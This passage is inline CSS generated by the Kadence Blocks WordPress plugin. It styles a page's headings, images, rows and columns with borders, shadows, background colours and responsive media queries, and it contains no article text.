mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_b581e3-4d img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_b581e3-4d[data-kb-block="kb-adv-heading76_b581e3-4d"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_b581e3-4d, .wp-block-kadence-advancedheading.kt-adv-heading76_b581e3-4d[data-kb-block="kb-adv-heading76_b581e3-4d"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_f76eed-54:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_f76eed-54 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_f76eed-54 img.kb-img, .kb-image76_f76eed-54 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_f76eed-54 img.kb-img, .kb-image76_f76eed-54 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_f76eed-54.kb-image-is-ratio-size, .kb-image76_f76eed-54 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_f76eed-54 figure{max-width:150px;}.kb-image76_f76eed-54 img.kb-img, .kb-image76_f76eed-54 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_160a97-00 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_160a97-00 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_7e378c-b0 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_7e378c-b0 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_7e378c-b0 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_7e378c-b0 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_7e378c-b0 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_7e378c-b0, .kt-inside-inner-col > .kadence-column76_7e378c-b0:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_7e378c-b0 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_7e378c-b0 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_0d7b2a-17 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_0d7b2a-17 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_0d7b2a-17 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_0d7b2a-17 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_0d7b2a-17 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_0d7b2a-17, .kt-inside-inner-col > .kadence-column76_0d7b2a-17:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_0d7b2a-17 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_0d7b2a-17 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_b4a828-b9, .wp-block-kadence-advancedheading.kt-adv-heading76_b4a828-b9[data-kb-block="kb-adv-heading76_b4a828-b9"]{padding-bottom:3px;text-align:center;color:#ffffff;}.wp-block-kadence-advancedheading.kt-adv-heading76_b4a828-b9 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_b4a828-b9[data-kb-block="kb-adv-heading76_b4a828-b9"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_b4a828-b9 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_b4a828-b9[data-kb-block="kb-adv-heading76_b4a828-b9"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_b4a828-b9, .wp-block-kadence-advancedheading.kt-adv-heading76_b4a828-b9[data-kb-block="kb-adv-heading76_b4a828-b9"]{font-size:22px;}}.kb-row-layout-id76_2ce397-50 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_2ce397-50 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_9dc34f-c1 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_9dc34f-c1 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_9dc34f-c1 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_9dc34f-c1 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_9dc34f-c1 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_9dc34f-c1, .kt-inside-inner-col > .kadence-column76_9dc34f-c1:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_9dc34f-c1 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_9dc34f-c1 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_a7953d-05 > .kt-inside-inner-col{border-left:6px solid #830249;}.kadence-column76_a7953d-05 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_a7953d-05 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_a7953d-05 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_a7953d-05 > .kt-inside-inner-col{background-color:#ececec;}.kadence-column76_a7953d-05, .kt-inside-inner-col > .kadence-column76_a7953d-05:not(.specificity){margin-bottom:5px;}@media all and (max-width: 1024px){.kadence-column76_a7953d-05 > .kt-inside-inner-col{border-left:6px solid #830249;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_a7953d-05 > .kt-inside-inner-col{border-left:6px solid #830249;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb, .wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb[data-kb-block="kb-adv-heading76_9ea998-fb"]{padding-left:10px;font-size:var(--global-kb-font-size-md, 1.25rem);border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}.wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb[data-kb-block="kb-adv-heading76_9ea998-fb"]{display:flex;gap:0.25em;align-items:center;}.wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb[data-kb-block="kb-adv-heading76_9ea998-fb"] .kb-adv-heading-icon svg{width:1em;height:1em;}.wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb[data-kb-block="kb-adv-heading76_9ea998-fb"] .kb-adv-heading-icon{color:#830249;}.wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb[data-kb-block="kb-adv-heading76_9ea998-fb"]:hover .kb-adv-heading-icon{color:#830249;}.wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb[data-kb-block="kb-adv-heading76_9ea998-fb"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb[data-kb-block="kb-adv-heading76_9ea998-fb"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 1024px){.wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb, .wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb[data-kb-block="kb-adv-heading76_9ea998-fb"]{border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb, .wp-block-kadence-advancedheading.kt-adv-heading76_9ea998-fb[data-kb-block="kb-adv-heading76_9ea998-fb"]{border-bottom:0px solid rgba(33,83,135,0);border-left:0px solid rgba(33,83,135,0);}}.kadence-column76_4bf5ec-da > .kt-inside-inner-col{border-left:6px solid #830249;}.kadence-column76_4bf5ec-da > .kt-inside-inner-col,.kadence-column76_4bf5ec-da > .kt-inside-inner-col:before{border-top-left-radius:0px;border-top-right-radius:0px;border-bottom-right-radius:0px;border-bottom-left-radius:30px;}.kadence-column76_4bf5ec-da > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_4bf5ec-da > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_4bf5ec-da > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_4bf5ec-da, .kt-inside-inner-col > .kadence-column76_4bf5ec-da:not(.specificity){margin-bottom:10px;}@media all and (max-width: 1024px){.kadence-column76_4bf5ec-da > .kt-inside-inner-col{border-left:6px solid #830249;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_4bf5ec-da > .kt-inside-inner-col{border-left:6px solid #830249;flex-direction:column;justify-content:center;}}.wp-block-kadence-iconlist.kt-svg-icon-list-items76_828333-54:not(.this-stops-third-party-issues){margin-bottom:var(--global-kb-spacing-sm, 1.5rem);}.wp-block-kadence-iconlist.kt-svg-icon-list-items76_828333-54 ul.kt-svg-icon-list:not(.this-prevents-issues):not(.this-stops-third-party-issues):not(.tijsloc){padding-left:15px;}.wp-block-kadence-iconlist.kt-svg-icon-list-items76_828333-54 ul.kt-svg-icon-list{grid-row-gap:5px;}.kt-svg-icon-list-item-76_fc76ab-b1 .kt-svg-icon-list-single{color:#830249 !important;}.kt-svg-icon-list-item-76_fc76ab-b1 .kt-svg-icon-list-text mark.kt-highlight{background-color:unset;color:#f76a0c;-webkit-box-decoration-break:clone;box-decoration-break:clone;}.kt-svg-icon-list-item-76_efb099-65 .kt-svg-icon-list-single{color:#830249 !important;}.kt-svg-icon-list-item-76_efb099-65 .kt-svg-icon-list-text mark.kt-highlight{background-color:unset;color:#f76a0c;-webkit-box-decoration-break:clone;box-decoration-break:clone;}.kadence-column76_56c4e9-ed > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_56c4e9-ed > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_56c4e9-ed > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_56c4e9-ed > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_56c4e9-ed > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_56c4e9-ed, .kt-inside-inner-col > .kadence-column76_56c4e9-ed:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_56c4e9-ed > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_56c4e9-ed > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_7e81fa-25, .wp-block-kadence-advancedheading.kt-adv-heading76_7e81fa-25[data-kb-block="kb-adv-heading76_7e81fa-25"]{padding-bottom:3px;text-align:center;color:#ffffff;}.wp-block-kadence-advancedheading.kt-adv-heading76_7e81fa-25 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_7e81fa-25[data-kb-block="kb-adv-heading76_7e81fa-25"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_7e81fa-25 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_7e81fa-25[data-kb-block="kb-adv-heading76_7e81fa-25"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_7e81fa-25, .wp-block-kadence-advancedheading.kt-adv-heading76_7e81fa-25[data-kb-block="kb-adv-heading76_7e81fa-25"]{font-size:22px;}}.kb-row-layout-id76_d55a89-42 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_d55a89-42 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_b87d80-e4 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_b87d80-e4 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_b87d80-e4 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_b87d80-e4 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_b87d80-e4 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_b87d80-e4, .kt-inside-inner-col > .kadence-column76_b87d80-e4:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_b87d80-e4 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_b87d80-e4 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_ad533c-50 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_ad533c-50 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_ad533c-50 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_ad533c-50 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_ad533c-50 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_ad533c-50, .kt-inside-inner-col > .kadence-column76_ad533c-50:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_ad533c-50 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_ad533c-50 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_6b0b41-27, .wp-block-kadence-advancedheading.kt-adv-heading76_6b0b41-27[data-kb-block="kb-adv-heading76_6b0b41-27"]{padding-bottom:3px;text-align:center;color:#ffffff;}.wp-block-kadence-advancedheading.kt-adv-heading76_6b0b41-27 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_6b0b41-27[data-kb-block="kb-adv-heading76_6b0b41-27"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_6b0b41-27 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_6b0b41-27[data-kb-block="kb-adv-heading76_6b0b41-27"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_6b0b41-27, .wp-block-kadence-advancedheading.kt-adv-heading76_6b0b41-27[data-kb-block="kb-adv-heading76_6b0b41-27"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_303e3a-da:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_303e3a-da .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_303e3a-da img.kb-img, .kb-image76_303e3a-da .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_303e3a-da img.kb-img, .kb-image76_303e3a-da .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_303e3a-da.kb-image-is-ratio-size, .kb-image76_303e3a-da .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_303e3a-da figure{max-width:150px;}.kb-image76_303e3a-da img.kb-img, .kb-image76_303e3a-da .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_f151c2-a9 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_f151c2-a9 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_46c469-f0 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_46c469-f0 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_46c469-f0 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_46c469-f0 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_46c469-f0 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_46c469-f0, .kt-inside-inner-col > .kadence-column76_46c469-f0:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_46c469-f0 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_46c469-f0 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_6d9313-b9 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_6d9313-b9 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_6d9313-b9 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_6d9313-b9 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_6d9313-b9 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_6d9313-b9, .kt-inside-inner-col > .kadence-column76_6d9313-b9:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_6d9313-b9 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_6d9313-b9 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_ca18fa-66, .wp-block-kadence-advancedheading.kt-adv-heading76_ca18fa-66[data-kb-block="kb-adv-heading76_ca18fa-66"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_ca18fa-66 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_ca18fa-66[data-kb-block="kb-adv-heading76_ca18fa-66"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_ca18fa-66 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_ca18fa-66[data-kb-block="kb-adv-heading76_ca18fa-66"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_ca18fa-66, .wp-block-kadence-advancedheading.kt-adv-heading76_ca18fa-66[data-kb-block="kb-adv-heading76_ca18fa-66"]{font-size:22px;}}.kb-row-layout-id76_5e58c3-ed > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_5e58c3-ed > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_77bacd-e1 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_77bacd-e1 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_77bacd-e1 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_77bacd-e1 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_77bacd-e1 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_77bacd-e1, .kt-inside-inner-col > .kadence-column76_77bacd-e1:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_77bacd-e1 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_77bacd-e1 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_1b22bd-78 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_1b22bd-78 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_1b22bd-78 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_1b22bd-78 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_1b22bd-78 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_1b22bd-78, .kt-inside-inner-col > .kadence-column76_1b22bd-78:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_1b22bd-78 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_1b22bd-78 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_a6c8d0-9d, .wp-block-kadence-advancedheading.kt-adv-heading76_a6c8d0-9d[data-kb-block="kb-adv-heading76_a6c8d0-9d"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_a6c8d0-9d mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_a6c8d0-9d[data-kb-block="kb-adv-heading76_a6c8d0-9d"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_a6c8d0-9d img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_a6c8d0-9d[data-kb-block="kb-adv-heading76_a6c8d0-9d"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_a6c8d0-9d, .wp-block-kadence-advancedheading.kt-adv-heading76_a6c8d0-9d[data-kb-block="kb-adv-heading76_a6c8d0-9d"]{font-size:22px;}}.kb-row-layout-id76_65255f-c6 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_65255f-c6 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_72eb74-89 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_72eb74-89 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_72eb74-89 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_72eb74-89 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_72eb74-89 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_72eb74-89, .kt-inside-inner-col > .kadence-column76_72eb74-89:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_72eb74-89 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_72eb74-89 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_79d0b4-06 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_79d0b4-06 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_79d0b4-06 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_79d0b4-06 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_79d0b4-06 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_79d0b4-06, .kt-inside-inner-col > .kadence-column76_79d0b4-06:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_79d0b4-06 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_79d0b4-06 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_bee370-6e, .wp-block-kadence-advancedheading.kt-adv-heading76_bee370-6e[data-kb-block="kb-adv-heading76_bee370-6e"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_bee370-6e mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_bee370-6e[data-kb-block="kb-adv-heading76_bee370-6e"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_bee370-6e img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_bee370-6e[data-kb-block="kb-adv-heading76_bee370-6e"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_bee370-6e, .wp-block-kadence-advancedheading.kt-adv-heading76_bee370-6e[data-kb-block="kb-adv-heading76_bee370-6e"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_60dfe2-a4:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_60dfe2-a4 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_60dfe2-a4 img.kb-img, .kb-image76_60dfe2-a4 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_60dfe2-a4 img.kb-img, .kb-image76_60dfe2-a4 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_60dfe2-a4.kb-image-is-ratio-size, .kb-image76_60dfe2-a4 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_60dfe2-a4 figure{max-width:150px;}.kb-image76_60dfe2-a4 img.kb-img, .kb-image76_60dfe2-a4 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_f10a61-58 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_f10a61-58 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_16865c-7b > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_16865c-7b > 